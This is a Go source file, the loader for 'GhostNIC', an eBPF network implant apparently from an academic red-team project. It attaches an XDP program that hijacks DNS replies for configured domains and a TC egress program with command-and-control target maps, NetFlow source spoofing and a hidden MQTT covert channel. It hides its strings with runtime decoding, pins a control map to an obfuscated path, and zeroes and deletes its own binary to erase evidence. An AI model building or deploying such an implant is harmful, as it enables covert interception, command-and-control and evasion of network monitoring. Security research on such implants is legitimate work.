// Package loader compiles the GhostNIC eBPF objects into the kernel, populates
// the required maps, attaches the programs, and then removes itself.
//
// Operational security choices:
//   - Maps are kept anonymous (not pinned to bpffs).
//   - The shared control_flag map is pinned to an obfuscated path so the
//     in-kernel trigger and a userspace trigger can update it.
//   - Only the TC program is briefly pinned during attachment and then removed.
//   - Sensitive strings are decoded at runtime from an obfuscated key table.
package loader

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/academic-redteam/ghostnic/pkg/config"
	"github.com/academic-redteam/ghostnic/pkg/encoder"
	"github.com/academic-redteam/ghostnic/pkg/obfuscate"
	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/vishvananda/netlink"
)

const objectDir = "build"

// pinBase is only used transiently for TC attachment.
var pinBase = obfuscate.Decode(obfuscate.O_sys_fs_bpf_ghostnic)

// controlPin is the persistent bpffs path for the shared control flag.
var controlPin = obfuscate.Decode(obfuscate.O_sys_fs_bpf_ksysdbg)

// LoadResult holds the attachment paths used during load.  Nothing is left
// pinned after a successful load unless keepPins is true.
type LoadResult struct {
	Interface string
}

// Load reads the compiled ELF objects, populates maps from cfg, attaches the
// programs to cfg.Interface, and optionally removes the loader binary.
func Load(cfg *config.Config, selfDestruct bool, keepPins bool) (*LoadResult, error) {
	res := &LoadResult{Interface: cfg.Interface}

	if !keepPins {
		_ = os.RemoveAll(pinBase)
	}
	if err := os.MkdirAll(pinBase, 0755); err != nil {
		return nil, fmt.Errorf(obfuscate.Decode(obfuscate.Ocreate_pin_directory)+": %w", err)
	}

	collXDP, err := loadDNSHijack(cfg)
	if err != nil {
		return nil, fmt.Errorf(obfuscate.Decode(obfuscate.Oload_xdp)+": %w", err)
	}
	defer collXDP.Close()

	ctrlMap := collXDP.Maps[obfuscate.Decode(obfuscate.Ocontrol_flag)]
	if ctrlMap == nil {
		return nil, fmt.Errorf("control_flag map not found")
	}
	if err := ctrlMap.Pin(controlPin); err != nil {
		return nil, fmt.Errorf("pin control flag: %w", err)
	}

	if err := loadTC(cfg, keepPins, ctrlMap); err != nil {
		return nil, fmt.Errorf(obfuscate.Decode(obfuscate.Oload_tc)+": %w", err)
	}

	if !keepPins {
		_ = os.RemoveAll(pinBase)
	}

	if selfDestruct {
		if err := selfDestructBinary(); err != nil {
			return nil, fmt.Errorf(obfuscate.Decode(obfuscate.Oself_destruct)+": %w", err)
		}
	}

	return res, nil
}

func loadDNSHijack(cfg *config.Config) (*ebpf.Collection, error) {
	progName := obfuscate.Decode(obfuscate.Oghost_dns_hijack)
	spec, err := loadCollectionSpecFromAnywhere(progName)
	if err != nil {
		return nil, fmt.Errorf("load collection spec: %w", err)
	}

	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return nil, fmt.Errorf("load collection: %w", err)
	}

	prog := coll.Programs[progName]
	if prog == nil {
		coll.Close()
		return nil, fmt.Errorf("program %s not found", progName)
	}
	m := coll.Maps[obfuscate.Decode(obfuscate.Odns_targets)]
	if m == nil {
		coll.Close()
		return nil, fmt.Errorf("map dns_targets not found")
	}
	m6 := coll.Maps[obfuscate.Decode(obfuscate.Odns6_targets)]
	if m6 == nil {
		coll.Close()
		return nil, fmt.Errorf("map dns6_targets not found")
	}
	if coll.Maps[obfuscate.Decode(obfuscate.Ocontrol_flag)] == nil {
		coll.Close()
		return nil, fmt.Errorf("map control_flag not found")
	}

	for domain, ipStr := range cfg.DNSTargets {
		ip, err := config.ParseIPv4(ipStr)
		if err != nil {
			return nil, fmt.Errorf("dns target %q: %w", domain, err)
		}
		key, err := config.PackDNSKey(domain)
		if err != nil {
			return nil, fmt.Errorf("dns key %q: %w", domain, err)
		}
		if err := m.Update(key, ip, ebpf.UpdateAny); err != nil {
			return nil, fmt.Errorf("update dns map: %w", err)
		}
	}
	for domain, ipStr := range cfg.DNS6Targets {
		ip, err := config.ParseIPv6(ipStr)
		if err != nil {
			return nil, fmt.Errorf("dns6 target %q: %w", domain, err)
		}
		key, err := config.PackDNSKey(domain)
		if err != nil {
			return nil, fmt.Errorf("dns6 key %q: %w", domain, err)
		}
		if err := m6.Update(key, ip, ebpf.UpdateAny); err != nil {
			return nil, fmt.Errorf("update dns6 map: %w", err)
		}
	}

	lnk, err := netlink.LinkByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("lookup interface %q: %w", cfg.Interface, err)
	}
	var modes []link.XDPAttachFlags
	switch os.Getenv("GHOSTNIC_XDP_MODE") {
	case "generic":
		modes = []link.XDPAttachFlags{link.XDPGenericMode}
	case "native", "driver":
		modes = []link.XDPAttachFlags{link.XDPDriverMode}
	default:
		modes = []link.XDPAttachFlags{link.XDPDriverMode, link.XDPGenericMode}
	}
	var attachErr error
	for _, mode := range modes {
		attachErr = netlink.LinkSetXdpFdWithFlags(lnk, prog.FD(), int(mode))
		if attachErr == nil {
			return coll, nil
		}
	}
	coll.Close()
	return nil, fmt.Errorf("attach xdp to %q (tried %+v): %w", cfg.Interface, modes, attachErr)
}

type nfKey struct {
	Daddr uint32
	Dport uint16
	Pad   uint16
}

type nfValue struct {
	Saddr uint32
}

type c2Key struct {
	Daddr uint32
	Dport uint16
	Pad   uint16
}

type baselineValue struct {
	Avg      uint32
	Variance uint32
}

type encoderValue struct {
	Key  uint32
	Mode uint32
}

func loadTC(cfg *config.Config, keepPins bool, ctrlMap *ebpf.Map) error {
	progName := obfuscate.Decode(obfuscate.Oghost_tc)
	spec, err := loadCollectionSpecFromAnywhere(progName)
	if err != nil {
		return fmt.Errorf("load collection spec: %w", err)
	}

	opts := ebpf.CollectionOptions{
		MapReplacements: map[string]*ebpf.Map{
			obfuscate.Decode(obfuscate.Ocontrol_flag): ctrlMap,
		},
	}
	coll, err := ebpf.NewCollectionWithOptions(spec, opts)
	if err != nil {
		return fmt.Errorf("load collection: %w", err)
	}
	defer coll.Close()

	prog := coll.Programs[progName]
	if prog == nil {
		return fmt.Errorf("program %s not found", progName)
	}

	mapNames := []string{
		obfuscate.Decode(obfuscate.Oc2_targets),
		obfuscate.Decode(obfuscate.Onetflow_collectors),
		obfuscate.Decode(obfuscate.Omqtt_baseline),
		obfuscate.Decode(obfuscate.Omqtt_encoder),
		obfuscate.Decode(obfuscate.Omqtt_hidden),
		obfuscate.Decode(obfuscate.Omqtt_idx),
		obfuscate.Decode(obfuscate.Omqtt_scratch),
	}
	maps := make(map[string]*ebpf.Map, len(mapNames))
	for _, n := range mapNames {
		m := coll.Maps[n]
		if m == nil {
			return fmt.Errorf("map %q not found", n)
		}
		maps[n] = m
	}

	zero := uint32(0)

	for _, c2 := range cfg.C2 {
		daddr, err := config.ParseIPv4(c2.Address)
		if err != nil {
			return fmt.Errorf("c2 address %q: %w", c2.Address, err)
		}
		key := c2Key{Daddr: daddr, Dport: c2.Port}
		var one byte = 1
		if err := maps[obfuscate.Decode(obfuscate.Oc2_targets)].Update(key, one, ebpf.UpdateAny); err != nil {
			return fmt.Errorf("update c2 map: %w", err)
		}
	}

	for _, nft := range cfg.Netflow {
		daddr, err := config.ParseIPv4(nft.Address)
		if err != nil {
			return fmt.Errorf("netflow address %q: %w", nft.Address, err)
		}
		spoof, err := config.ParseIPv4(nft.Spoof)
		if err != nil {
			return fmt.Errorf("netflow spoof %q: %w", nft.Spoof, err)
		}
		key := nfKey{Daddr: daddr, Dport: nft.Port}
		val := nfValue{Saddr: spoof}
		if err := maps[obfuscate.Decode(obfuscate.Onetflow_collectors)].Update(key, val, ebpf.UpdateAny); err != nil {
			return fmt.Errorf("update netflow map: %w", err)
		}
	}

	if err := maps[obfuscate.Decode(obfuscate.Omqtt_baseline)].Update(zero, baselineValue{Avg: cfg.MQTT.Average, Variance: cfg.MQTT.Window}, ebpf.UpdateAny); err != nil {
		return fmt.Errorf("update mqtt baseline: %w", err)
	}
	if err := maps[obfuscate.Decode(obfuscate.Omqtt_encoder)].Update(zero, encoderValue{Key: cfg.Encoder.Key, Mode: cfg.Encoder.Mode}, ebpf.UpdateAny); err != nil {
		return fmt.Errorf("update mqtt encoder: %w", err)
	}

	hiddenBits, err := encoder.EncodeBits([]byte(cfg.HiddenMsg), cfg.Encoder.Key)
	if err != nil {
		return fmt.Errorf("encode hidden message: %w", err)
	}
	hiddenMap := maps[obfuscate.Decode(obfuscate.Omqtt_hidden)]
	byteLen := (len(hiddenBits) + 7) / 8
	if max := int(hiddenMap.MaxEntries()); byteLen > max {
		byteLen = max
	}
	hiddenBytes := make([]byte, byteLen)
	for i := 0; i < byteLen; i++ {
		var b byte
		for j := 0; j < 8 && i*8+j < len(hiddenBits); j++ {
			if hiddenBits[i*8+j] != 0 {
				b |= 1 << j
			}
		}
		hiddenBytes[i] = b
	}
	for i := 0; i < byteLen; i++ {
		idx := uint32(i)
		if err := hiddenMap.Update(idx, hiddenBytes[i], ebpf.UpdateAny); err != nil {
			return fmt.Errorf("update mqtt_hidden: %w", err)
		}
	}
	if err := maps[obfuscate.Decode(obfuscate.Omqtt_idx)].Update(zero, uint32(0), ebpf.UpdateAny); err != nil {
		return fmt.Errorf("update mqtt_idx: %w", err)
	}

	progPath := filepath.Join(pinBase, obfuscate.Decode(obfuscate.Oprog_tc))
	if err := prog.Pin(progPath); err != nil {
		return fmt.Errorf("pin tc program: %w", err)
	}

	if err := attachTC(cfg.Interface, progPath); err != nil {
		_ = os.Remove(progPath)
		return fmt.Errorf("attach tc: %w", err)
	}

	if !keepPins {
		_ = prog.Unpin()
	}
	return nil
}

func attachTC(iface, pinnedProg string) error {
	out, err := exec.Command("tc", "qdisc", "add", "dev", iface, "clsact").CombinedOutput()
	if err != nil && !strings.Contains(string(out), "File exists") {
		return fmt.Errorf("tc qdisc add: %v: %s", err, out)
	}

	out, err = exec.Command("tc", "filter", "add", "dev", iface, "egress", "bpf",
		"direct-action", "pinned", pinnedProg).CombinedOutput()
	if err != nil {
		return fmt.Errorf("tc filter add: %v: %s", err, out)
	}
	return nil
}

// Unload removes GhostNIC attachments.  It does not require pinned objects.
//
// Detach mode correctness: the kernel matches the XDP detach flags against
// the mode the program was attached with, so a driver-mode attachment is not
// removed by a generic-mode detach.  Load() tries driver mode first and falls
// back to generic (see loadDNSHijack), so Unload must attempt both and then
// verify that no XDP program remains.  All errors are propagated: a silent
// detach failure leaves the implant attached and contaminates any subsequent
// "clean" baseline (see XDPLAB audit, loader.go detach-mode bug).
func Unload(iface string) error {
	// Attempt every detach step even if an earlier one fails, so a partial
	// state (e.g. XDP attached but no tc qdisc) is still fully cleaned up;
	// all collected errors are reported at the end.
	var errs []error
	if out, err := exec.Command("tc", "filter", "del", "dev", iface, "egress").CombinedOutput(); err != nil {
		errs = append(errs, fmt.Errorf("tc filter del dev %q egress: %v: %s", iface, err, out))
	}
	if out, err := exec.Command("tc", "qdisc", "del", "dev", iface, "clsact").CombinedOutput(); err != nil {
		errs = append(errs, fmt.Errorf("tc qdisc del dev %q clsact: %v: %s", iface, err, out))
	}

	lnk, err := netlink.LinkByName(iface)
	if err != nil {
		errs = append(errs, fmt.Errorf("lookup interface %q: %w", iface, err))
		return errors.Join(errs...)
	}
	detached := false
	var detachErr error
	for _, mode := range []link.XDPAttachFlags{link.XDPDriverMode, link.XDPGenericMode} {
		if e := netlink.LinkSetXdpFdWithFlags(lnk, -1, int(mode)); e == nil {
			detached = true
		} else {
			detachErr = e
		}
	}
	if !detached {
		errs = append(errs, fmt.Errorf("detach xdp from %q: %w", iface, detachErr))
	}

	// Verify no XDP program remains attached.
	lnk, err = netlink.LinkByName(iface)
	if err != nil {
		errs = append(errs, fmt.Errorf("re-lookup interface %q: %w", iface, err))
	} else if xdp := lnk.Attrs().Xdp; xdp != nil && xdp.Attached {
		errs = append(errs, fmt.Errorf("xdp program id %d still attached to %q after detach", xdp.ProgId, iface))
	}

	if err := os.RemoveAll(pinBase); err != nil {
		errs = append(errs, fmt.Errorf("remove pin dir: %w", err))
	}
	if err := os.Remove(controlPin); err != nil && !os.IsNotExist(err) {
		errs = append(errs, fmt.Errorf("remove control pin: %w", err))
	}
	return errors.Join(errs...)
}

// SetControlFlag updates the shared control flag via its pinned bpffs path.
func SetControlFlag(value byte) error {
	m, err := ebpf.LoadPinnedMap(controlPin, nil)
	if err != nil {
		return fmt.Errorf("load pinned control flag: %w", err)
	}
	defer m.Close()

	idx := uint32(0)
	return m.Update(idx, value, ebpf.UpdateAny)
}

// selfDestructBinary overwrites the current executable with zeros and unlinks it.
func selfDestructBinary() error {
	path, err := os.Executable()
	if err != nil {
		return err
	}
	path, err = filepath.EvalSymlinks(path)
	if err != nil {
		return err
	}

	info, err := os.Stat(path)
	if err != nil {
		return err
	}

	f, err := os.OpenFile(path, os.O_WRONLY, info.Mode())
	if err != nil {
		return err
	}
	defer f.Close()

	zeros := make([]byte, 4096)
	remaining := info.Size()
	for remaining > 0 {
		n := int64(len(zeros))
		if remaining < n {
			n = remaining
		}
		if _, err := f.Write(zeros[:n]); err != nil {
			return err
		}
		remaining -= n
	}
	f.Sync()

	// Small delay to let the write hit the block layer before unlinking.
	time.Sleep(50 * time.Millisecond)
	return os.Remove(path)
}
